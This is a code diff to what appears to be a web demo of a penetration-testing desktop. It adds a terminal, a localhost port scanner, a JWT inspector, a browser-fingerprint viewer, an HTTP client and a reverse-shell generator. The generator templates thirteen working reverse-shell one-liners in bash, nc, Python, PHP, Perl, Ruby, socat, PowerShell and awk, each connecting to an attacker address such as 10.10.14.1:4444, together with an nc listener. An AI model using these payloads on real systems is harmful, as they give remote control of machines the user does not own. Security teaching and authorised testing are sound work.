-      if (i >= INTRO.length) { input.focus(); return; }
-      const [k, t] = INTRO[i++];
-      if (k === 'cmd') append(PROMPT() + t);
-      else if (k === 'hint') append('<span class="o">' + t + '</span>');
-      else append(t);
-      body.scrollTop = body.scrollHeight;
-      setTimeout(play, k === 'out' ? 260 : 460);
-    })();
+    const fit = new FitAddon.FitAddon();
+    term.loadAddon(fit);
+    term.open(host);
+    // US / QWERTY-International dead keys ( ' " ` ~ ^ ): let the browser compose
+    // them instead of xterm handling the raw keydown, so the composed character
+    // (a straight quote, etc.) flows in via xterm's composition/input path
+    // rather than coming out as a spacing accent ( ´ ¨ ).
+    term.attachCustomKeyEventHandler((e) => {
+      if (e.type === 'keydown' && (e.key === 'Dead' || e.isComposing || e.keyCode === 229)) return false;
+      return true;
+    });
+    const refit = () => { try { fit.fit(); } catch (e) {} };
+    requestAnimationFrame(refit);
+
+    // mirror the shared serial console into this view, and type back to it
+    if (VM.backlog) term.write(VM.backlog);
+    const detach = VM.attach(ch => term.write(ch));
+    term.onData(s => VM.send(s));
+
+    // reveal the terminal once Linux is up. Only grab the keyboard if the
+    // terminal is still the active window and the user isn't typing in a field
+    // elsewhere (booting can finish seconds later, mid-edit in another app).
+    VM.onBoot(() => {
+      bootEl.classList.add('hidden'); dot.classList.add('on'); refit();
+      const ae = document.activeElement;
+      const editing = ae && /^(INPUT|TEXTAREA|SELECT)$/.test(ae.tagName);
+      if (active && active.el === win && !editing) term.focus();
+    });
+    const ro = new ResizeObserver(refit); ro.observe(host);
+    if (!VM.emu) VM.start();
+
+    win._termFocus = () => term.focus();
+    win._termCleanup = () => { ro.disconnect(); detach(); try { term.dispose(); } catch (e) {} };
     return d;
   }
 
@@ -949,6 +1131,294 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     return d;
   }
 
+  // ---- Port Scanner: a real, local scan of YOUR OWN machine (loopback) ----
+  // Browsers can't send raw packets, so this times connections: a refused port
+  // fails fast, an open one either answers (HTTP) or hangs until the timeout.
+  // It only meaningfully probes 127.0.0.1 / localhost, and the browser itself
+  // blocks a set of ports (shown as such). Entirely client-side, no backend.
+  const PS_BLOCKED = new Set([1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,69,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,137,139,143,161,179,389,427,465,512,513,514,515,526,530,531,532,540,548,554,556,563,587,601,636,989,990,993,995,1719,1720,1723,2049,3659,4045,5060,5061,6000,6566,6665,6666,6667,6668,6669,6697,10080]);
+  const PS_PRESET = [80,443,3000,3001,4200,5000,5173,5432,5900,6379,8000,8080,8081,8443,9000,9200,11211,27017,3306];
+  const PS_SERVICE = {80:'http',443:'https',3000:'node / dev',3001:'node / dev',3306:'mysql',4200:'angular',5000:'flask / dev',5173:'vite',5432:'postgres',5900:'vnc',6379:'redis',8000:'http-alt',8080:'http-proxy',8081:'http-alt',8443:'https-alt',9000:'php-fpm / sonar',9200:'elasticsearch',11211:'memcached',27017:'mongodb'};
+
+  function makeScanner(app) {
+    const d = document.createElement('div'); d.className = 'demo-scan';
+    d.innerHTML = `
+      <div class="scan-top">
+        <label class="scan-field"><span>Target</span><input class="scan-host" value="127.0.0.1" spellcheck="false" autocomplete="off"></label>
+        <label class="scan-field wide"><span>Ports</span><input class="scan-ports" value="${PS_PRESET.join(',')}" spellcheck="false" autocomplete="off"></label>
+        <button class="scan-go primary-btn">Scan</button>
+      </div>
+      <div class="scan-note">Best-effort scan of <b>your own machine</b> by connection timing &mdash; browsers can't send raw packets, so this is not nmap. Only loopback (<code>127.0.0.1</code> / <code>localhost</code>) is meaningful; some ports are blocked by the browser. Open / responding services are listed below.</div>
+      <div class="scan-bar"><i></i></div>
+      <div class="scan-results"><div class="scan-empty">Hit <b>Scan</b> to probe your localhost.</div></div>`;
+    const hostEl = d.querySelector('.scan-host');
+    const portsEl = d.querySelector('.scan-ports');
+    const go = d.querySelector('.scan-go');
+    const bar = d.querySelector('.scan-bar i');
+    const results = d.querySelector('.scan-results');
+    let running = false, cancel = false;
+
+    // A page can only probe loopback when it is itself served from a loopback
+    // origin; otherwise the browser's Private Network Access rules block every
+    // request to 127.0.0.1 (so the scan silently finds nothing).
+    const canProbe = location.protocol !== 'file:' &&
+      /^(localhost|127(?:\.\d+){3}|\[::1\]|(?:.+\.)?localhost)$/i.test(location.hostname);
+    const originLabel = location.protocol === 'file:' ? 'a local file (file://)' : location.origin;
+    if (!canProbe) {
+      results.innerHTML = `<div class="scan-empty"><b>This page can't probe your localhost.</b><br>It is served from <code>${originLabel}</code>, and browsers block a non-local page from reaching <code>127.0.0.1</code> (Private Network Access), so the scan will find nothing here.<br><br>To use the scanner, serve the demo from loopback: run <code>python3 -m http.server</code> inside <code>docs/</code> and open <code>http://localhost:8000/</code>.</div>`;
+    }
+
+    function row(r) {
+      const label = { open:'open', filtered:'open | filtered', blocked:'browser-blocked', closed:'closed' }[r.state] || r.state;
+      const el = document.createElement('div'); el.className = 'scan-row ' + r.state;
+      el.innerHTML = `<span class="sr-port">${r.port}</span><span class="sr-state">${label}</span><span class="sr-ms">${r.ms!=null?Math.round(r.ms)+' ms':''}</span><span class="sr-note">${r.note||PS_SERVICE[r.port]||''}</span>`;
+      return el;
+    }
+
+    async function probe(host, port, timeout) {
+      if (PS_BLOCKED.has(port)) return { port, state:'blocked', note:'blocked by the browser' };
+      const t0 = performance.now();
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), timeout);
+      try {
+        await fetch(`http://${host}:${port}/`, { mode:'no-cors', cache:'no-store', signal: ctrl.signal });
+        clearTimeout(timer);
+        return { port, state:'open', ms: performance.now()-t0 };
+      } catch (e) {
+        clearTimeout(timer);
+        const dt = performance.now()-t0;
+        // Hit the timeout => the socket connected but nothing spoke HTTP back:
+        // an open, non-HTTP service. A plain network error => connection refused.
+        if (ctrl.signal.aborted) return { port, state:'filtered', ms: dt, note:'connected, no HTTP reply' };
+        return { port, state:'closed', ms: dt };
+      }
+    }
+
+    async function scan() {
+      if (running) { cancel = true; return; }
+      const host = (hostEl.value || '127.0.0.1').trim();
+      const ports = [...new Set(portsEl.value.split(/[,\s]+/).map(s => parseInt(s, 10)).filter(n => n > 0 && n < 65536))];
+      if (!ports.length) return;
+      running = true; cancel = false; go.textContent = 'Stop'; go.classList.add('stop');
+      results.innerHTML = ''; bar.style.width = '0%';
+      let done = 0;
+      const queue = ports.slice();
+      const worker = async () => {
+        while (queue.length && !cancel) {
+          const r = await probe(host, queue.shift(), 1400);
+          done++; bar.style.width = (100 * done / ports.length).toFixed(0) + '%';
+          if (r.state === 'open' || r.state === 'filtered') results.appendChild(row(r));
+        }
+      };
+      await Promise.all(Array.from({ length: 10 }, worker));
+      if (!results.children.length) results.innerHTML = canProbe
+        ? `<div class="scan-empty">No responding services on ${host}. Refused and browser-blocked ports are hidden.</div>`
+        : `<div class="scan-empty">Nothing found &mdash; this page (<code>${originLabel}</code>) is not allowed to probe localhost. Serve the demo from <code>http://localhost</code> to use the scanner.</div>`;
+      running = false; go.textContent = 'Scan'; go.classList.remove('stop');
+    }
+    go.addEventListener('click', scan);
+    portsEl.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); scan(); } });
+    return d;
+  }
+
+  // ---- shared: copy to clipboard with a small visual ack ----
+  function copyText(text, btn) {
+    const ack = () => { if (btn) { const o = btn.textContent; btn.textContent = '✓'; setTimeout(() => btn.textContent = o, 900); } };
+    const fallback = () => { const t = document.createElement('textarea'); t.value = text; document.body.appendChild(t); t.select(); try { document.execCommand('copy'); } catch (e) {} t.remove(); ack(); };
+    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(ack).catch(fallback);
+    else fallback();
+  }
+
+  // ---- Reverse Shell generator (pure string templating, fully offline) ----
+  function makeRevShell(app) {
+    const d = document.createElement('div'); d.className = 'demo-rev';
+    const SHELLS = ['bash','sh','zsh','ash','dash','ksh','fish'];
+    const PAYLOADS = [
+      ['Bash -i',        (ip,p,s)=>`${s} -i >& /dev/tcp/${ip}/${p} 0>&1`],
+      ['Bash 196',       (ip,p,s)=>`0<&196;exec 196<>/dev/tcp/${ip}/${p}; ${s} <&196 >&196 2>&196`],
+      ['Bash read line', (ip,p)=>`exec 5<>/dev/tcp/${ip}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done`],
+      ['nc -e',          (ip,p,s)=>`nc ${ip} ${p} -e ${s}`],
+      ['nc mkfifo',      (ip,p,s)=>`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${s} -i 2>&1|nc ${ip} ${p} >/tmp/f`],
+      ['ncat --ssl',     (ip,p,s)=>`ncat --ssl ${ip} ${p} -e ${s}`],
+      ['Python3 pty',    (ip,p,s)=>`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("${s}")'`],
+      ['PHP',            (ip,p,s)=>`php -r '$sock=fsockopen("${ip}",${p});exec("${s} -i <&3 >&3 2>&3");'`],
+      ['Perl',           (ip,p,s)=>`perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${s} -i");};'`],
+      ['Ruby',           (ip,p,s)=>`ruby -rsocket -e'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("${s} -i <&%d >&%d 2>&%d",f,f,f)'`],
+      ['socat',          (ip,p,s)=>`socat TCP:${ip}:${p} EXEC:'${s}',pty,stderr,setsid,sigint,sane`],
+      ['PowerShell',     (ip,p)=>`powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('${ip}',${p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`],
+      ['awk',            (ip,p)=>`awk 'BEGIN{s="/inet/tcp/0/${ip}/${p}";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}' /dev/null`],
+    ];
+    d.innerHTML = `
+      <div class="rev-top">
+        <label class="fl"><span>LHOST</span><input class="rv-ip" value="10.10.14.1" spellcheck="false" autocomplete="off"></label>
+        <label class="fl"><span>LPORT</span><input class="rv-port" value="4444" spellcheck="false" autocomplete="off"></label>
+        <label class="fl"><span>Shell</span><select class="rv-shell field">${SHELLS.map(s=>`<option${s==='bash'?' selected':''}>${s}</option>`).join('')}</select></label>
+      </div>
+      <div class="rev-lsnbar">Listener <code class="rv-lsn"></code><button class="rev-cp" title="Copy">⧉</button></div>
+      <div class="rev-list"></div>`;
+    const ipEl = d.querySelector('.rv-ip'), portEl = d.querySelector('.rv-port'), shEl = d.querySelector('.rv-shell');
+    const list = d.querySelector('.rev-list'), lsn = d.querySelector('.rv-lsn');
+    function render() {
+      const ip = ipEl.value.trim() || '10.10.14.1', p = portEl.value.trim() || '4444', s = shEl.value;
+      lsn.textContent = `nc -lvnp ${p}`;
+      list.innerHTML = '';
+      PAYLOADS.forEach(([name, fn]) => {
+        const code = fn(ip, p, s);
+        const row = document.createElement('div'); row.className = 'rev-row';
+        row.innerHTML = `<div class="rev-name">${name}</div><pre class="rev-code"></pre><button class="rev-cp" title="Copy">⧉</button>`;
+        row.querySelector('.rev-code').textContent = code;
+        row.querySelector('.rev-cp').addEventListener('click', (e) => copyText(code, e.currentTarget));
+        list.appendChild(row);
+      });
+    }
+    [ipEl, portEl].forEach(e => e.addEventListener('input', render));
+    shEl.addEventListener('change', render);
+    d.querySelector('.rev-lsnbar .rev-cp').addEventListener('click', (e) => copyText(lsn.textContent, e.currentTarget));
+    render();
+    return d;
+  }
+
+  // ---- JWT inspector (decode + HS256/384/512 verify via WebCrypto) ----
+  function makeJwt(app) {
+    const d = document.createElement('div'); d.className = 'demo-jwt';
+    d.innerHTML = `
+      <label class="fl2"><span>Token</span><textarea class="jwt-token" spellcheck="false" placeholder="paste a JWT: eyJhbGciOi..."></textarea></label>
+      <div class="jwt-verify">
+        <input class="jwt-secret field" spellcheck="false" autocomplete="off" placeholder="HMAC secret">
+        <button class="jwt-go primary-btn">Verify</button>
+        <span class="jwt-status"></span>
+      </div>
+      <div class="jwt-panes">
+        <div class="jwt-pane"><div class="jwt-h">Header</div><pre class="jwt-header"></pre></div>
+        <div class="jwt-pane"><div class="jwt-h">Payload</div><pre class="jwt-payload"></pre></div>
+      </div>
+      <div class="jwt-claims"></div>`;
+    const tok = d.querySelector('.jwt-token'), secEl = d.querySelector('.jwt-secret');
+    const hdrEl = d.querySelector('.jwt-header'), payEl = d.querySelector('.jwt-payload');
+    const claimsEl = d.querySelector('.jwt-claims'), statusEl = d.querySelector('.jwt-status');
+    const b64urlToStr = (b) => { b = b.replace(/-/g,'+').replace(/_/g,'/'); while (b.length%4) b+='='; try { return decodeURIComponent(escape(atob(b))); } catch (e) { try { return atob(b); } catch (_) { return null; } } };
+    let parsed = null;
+    function decode() {
+      statusEl.textContent = ''; statusEl.className = 'jwt-status'; claimsEl.innerHTML = ''; parsed = null;
+      const t = tok.value.trim();
+      if (!t) { hdrEl.textContent = ''; payEl.textContent = ''; return; }
+      const parts = t.split('.');
+      if (parts.length < 2) { hdrEl.textContent = ''; payEl.textContent = 'Not a JWT (expected header.payload.signature).'; return; }
+      const hs = b64urlToStr(parts[0]), ps = b64urlToStr(parts[1]);
+      let hj = null, pj = null; try { hj = JSON.parse(hs); } catch (e) {} try { pj = JSON.parse(ps); } catch (e) {}
+      hdrEl.textContent = hj ? JSON.stringify(hj, null, 2) : (hs || '(cannot decode header)');
+      payEl.textContent = pj ? JSON.stringify(pj, null, 2) : (ps || '(cannot decode payload)');
+      parsed = { parts, hj, pj };
+      const notes = [];
+      if (hj && /^none$/i.test(hj.alg || '')) notes.push(['bad', 'alg: none — signature not checked. Many libraries accept this, a classic auth-bypass forgery.']);
+      if (pj && pj.exp) { const expd = Date.now() > pj.exp*1000; notes.push([expd?'bad':'ok', `exp ${new Date(pj.exp*1000).toISOString()} — ${expd?'EXPIRED':'valid'}`]); }
+      if (pj && pj.iat) notes.push(['muted', `iat ${new Date(pj.iat*1000).toISOString()}`]);
+      if (pj && pj.nbf) notes.push(['muted', `nbf ${new Date(pj.nbf*1000).toISOString()}`]);
+      claimsEl.innerHTML = notes.map(([c,t]) => `<div class="jwt-note ${c}">${t}</div>`).join('');
+    }
+    async function verify() {
+      decode();
+      if (!parsed || parsed.parts.length < 3) { statusEl.textContent = 'need all 3 parts to verify'; statusEl.className = 'jwt-status muted'; return; }
+      const alg = ((parsed.hj && parsed.hj.alg) || '').toUpperCase();
+      const map = { HS256:'SHA-256', HS384:'SHA-384', HS512:'SHA-512' };
+      if (!map[alg]) { statusEl.textContent = `can verify HS256/384/512 here (alg=${alg || '?'})`; statusEl.className = 'jwt-status muted'; return; }
+      try {
+        const enc = new TextEncoder();
+        const key = await crypto.subtle.importKey('raw', enc.encode(secEl.value), { name:'HMAC', hash: map[alg] }, false, ['sign']);
+        const sig = await crypto.subtle.sign('HMAC', key, enc.encode(parsed.parts[0] + '.' + parsed.parts[1]));
+        const b64 = btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+        const ok = b64 === parsed.parts[2];
+        statusEl.textContent = ok ? '✓ signature valid' : '✗ signature invalid';
+        statusEl.className = 'jwt-status ' + (ok ? 'ok' : 'bad');
+      } catch (e) { statusEl.textContent = 'verify error: ' + e.message; statusEl.className = 'jwt-status bad'; }
+    }
+    tok.addEventListener('input', decode);
+    d.querySelector('.jwt-go').addEventListener('click', verify);
+    tok.value = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwibmFtZSI6InZ1bHBlcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIzOTAyMiwiZXhwIjoyMDU2MjM5MDIyfQ.LyTZgcT5p4Hqp9PdlIEGYB8EbMua8taE6dCeHRdhkzY';
+    secEl.value = 'secret';
+    decode();
+    return d;
+  }
+
+  // ---- Browser Leaks: what a site can fingerprint, gathered locally ----
+  function makeLeaks(app) {
+    const d = document.createElement('div'); d.className = 'demo-leak';
+    d.innerHTML = `<div class="leak-note">Everything a website can learn about you with no permission prompt — gathered locally, nothing leaves this page.</div><div class="leak-grid"></div>`;
+    const grid = d.querySelector('.leak-grid');
+    const add = (k, v) => { const r = document.createElement('div'); r.className = 'leak-row'; r.innerHTML = `<span class="lk"></span><span class="lv"></span>`; r.querySelector('.lk').textContent = k; r.querySelector('.lv').textContent = (v == null || v === '') ? '—' : String(v); grid.appendChild(r); return r.querySelector('.lv'); };
+    const n = navigator, s = screen, off = -new Date().getTimezoneOffset()/60;
+    add('User agent', n.userAgent);
+    add('Platform', n.platform);
+    add('Languages', (n.languages || [n.language]).join(', '));
+    add('CPU cores', n.hardwareConcurrency);
+    add('Device memory', n.deviceMemory ? n.deviceMemory + ' GB' : null);
+    add('Screen', `${s.width}×${s.height} @ ${window.devicePixelRatio}x · ${s.colorDepth}-bit`);
+    add('Timezone', `${Intl.DateTimeFormat().resolvedOptions().timeZone} (UTC${off>=0?'+':''}${off})`);
+    add('Touch points', n.maxTouchPoints);
+    add('Cookies enabled', n.cookieEnabled);
+    add('Do Not Track', n.doNotTrack || 'not set');
+    try { const c = document.createElement('canvas'); const gl = c.getContext('webgl') || c.getContext('experimental-webgl'); if (gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info'); add('GPU', dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)); } else add('GPU', 'no WebGL'); } catch (e) { add('GPU', 'blocked'); }
+    try { const c = document.createElement('canvas'); c.width = 200; c.height = 40; const x = c.getContext('2d'); x.textBaseline = 'top'; x.font = '14px Arial'; x.fillStyle = '#f60'; x.fillRect(0,0,100,20); x.fillStyle = '#069'; x.fillText('Vulpes🦊fingerprint', 2, 2); const u = c.toDataURL(); let h = 0; for (let i = 0; i < u.length; i++) h = (h*31 + u.charCodeAt(i)) >>> 0; add('Canvas fingerprint', '0x' + h.toString(16).padStart(8,'0')); } catch (e) { add('Canvas fingerprint', 'blocked'); }
+    const rtc = add('WebRTC local IPs', 'probing…');
+    try {
+      const ips = new Set(); const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('x');
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) { pc.close(); rtc.textContent = ips.size ? [...ips].join(', ') : 'none exposed'; return; }
+        const m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+        if (m && !/\.local/.test(e.candidate.candidate)) { ips.add(m[1]); rtc.textContent = [...ips].join(', '); }
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => { rtc.textContent = 'unavailable'; });
+      setTimeout(() => { if (rtc.textContent === 'probing…') rtc.textContent = 'none exposed (or masked)'; }, 2500);
+    } catch (e) { rtc.textContent = 'unavailable'; }
+    return d;
+  }
+
+  // ---- HTTP client (real fetch; honest about CORS) ----
+  function makeHttpClient(app) {
+    const d = document.createElement('div'); d.className = 'demo-http';
+    d.innerHTML = `
+      <div class="http-bar">
+        <select class="h-method field">${['GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS'].map(m=>`<option>${m}</option>`).join('')}</select>
+        <input class="h-url field" value="https://httpbin.org/get" spellcheck="false" autocomplete="off" placeholder="https://...">
+        <button class="h-send primary-btn">Send</button>
+      </div>
+      <div class="http-tabs"><button class="htb active" data-t="headers">Headers</button><button class="htb" data-t="body">Body</button></div>
+      <div class="http-pane" data-p="headers"><div class="kv-rows"></div><button class="kv-add ghost-btn">+ header</button></div>
+      <div class="http-pane" data-p="body" hidden><textarea class="h-body field" spellcheck="false" placeholder='{"key":"value"}'></textarea></div>
+      <div class="http-note">A real <code>fetch()</code> from your browser. If the target doesn't allow cross-origin reads (CORS), the browser blocks the response — that's a browser rule, not Vulpes. In the full Vulpes requests go out server-side with no such limit.</div>
+      <div class="http-resp"><div class="hr-status"></div><pre class="hr-body"></pre></div>`;
+    const rows = d.querySelector('.kv-rows');
+    const addRow = (k='', v='') => { const r = document.createElement('div'); r.className = 'kv-row'; r.innerHTML = `<input class="kv-k field" placeholder="Header" spellcheck="false"><input class="kv-v field" placeholder="value" spellcheck="false"><button class="kv-del">×</button>`; r.querySelector('.kv-k').value = k; r.querySelector('.kv-v').value = v; r.querySelector('.kv-del').addEventListener('click', () => r.remove()); rows.appendChild(r); };
+    addRow('Accept', 'application/json');
+    d.querySelector('.kv-add').addEventListener('click', () => addRow());
+    d.querySelectorAll('.htb').forEach(b => b.addEventListener('click', () => { d.querySelectorAll('.htb').forEach(x => x.classList.toggle('active', x === b)); d.querySelectorAll('.http-pane').forEach(p => p.hidden = p.dataset.p !== b.dataset.t); }));
+    const statusEl = d.querySelector('.hr-status'), bodyEl = d.querySelector('.hr-body');
+    d.querySelector('.h-send').addEventListener('click', async () => {
+      const method = d.querySelector('.h-method').value, url = d.querySelector('.h-url').value.trim();
+      if (!url) return;
+      const headers = {}; rows.querySelectorAll('.kv-row').forEach(r => { const k = r.querySelector('.kv-k').value.trim(); if (k) headers[k] = r.querySelector('.kv-v').value; });
+      const body = d.querySelector('.h-body').value;
+      const init = { method, headers }; if (!['GET','HEAD'].includes(method) && body) init.body = body;
+      statusEl.textContent = 'sending…'; statusEl.className = 'hr-status'; bodyEl.textContent = '';
+      const t0 = performance.now();
+      try {
+        const res = await fetch(url, init);
+        const ms = Math.round(performance.now() - t0);
+        const text = await res.text();
+        statusEl.innerHTML = `<span class="hr-code ${res.ok?'ok':'bad'}">${res.status} ${res.statusText}</span><span class="hr-ms">${ms} ms · ${text.length} B</span>`;
+        const hh = [...res.headers.entries()].map(([k,v]) => `${k}: ${v}`).join('\n');
+        let pretty = text; try { pretty = JSON.stringify(JSON.parse(text), null, 2); } catch (e) {}
+        bodyEl.textContent = (hh ? ('— response headers —\n' + hh + '\n\n— body —\n') : '') + pretty;
+      } catch (e) {
+        const ms = Math.round(performance.now() - t0);
+        statusEl.innerHTML = `<span class="hr-code bad">request blocked</span><span class="hr-ms">${ms} ms</span>`;
+        bodyEl.textContent = e.message + '\n\nMost often this is CORS: the target sent no Access-Control-Allow-Origin, so the browser refused to let the page read the response. Try a CORS-friendly API (e.g. https://httpbin.org/get). In the real Vulpes the request is made server-side, with no CORS limit.';
+      }
+    });
+    return d;
+  }
+
   // ---- taskbar / app switcher ----
   function renderTasks() {
     const t = $('tasks'); t.innerHTML = '';
@@ -956,7 +1426,7 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
       const mini = o.el.style.display === 'none';
       const b = document.createElement('button');
       b.className = 'task' + (o === active && !mini ? ' active' : '') + (mini ? ' minimized' : '');
-      b.innerHTML = `<span class="app-icon monogram">${o.app.mono}</span><span>${o.app.name}</span><span class="task-close" title="Close">×</span>`;
+      b.innerHTML = `${iconHTML(o.app)}<span>${o.app.name}</span><span class="task-close" title="Close">×</span>`;
       b.addEventListener('click', (e) => { if (e.target.closest('.task-close')) { e.stopPropagation(); closeWindow(o); return; } if (mini || o !== active) focus(o); else { o.el.classList.add('mini'); o.el.style.display = 'none'; renderTasks(); } });
       t.appendChild(b);
     });
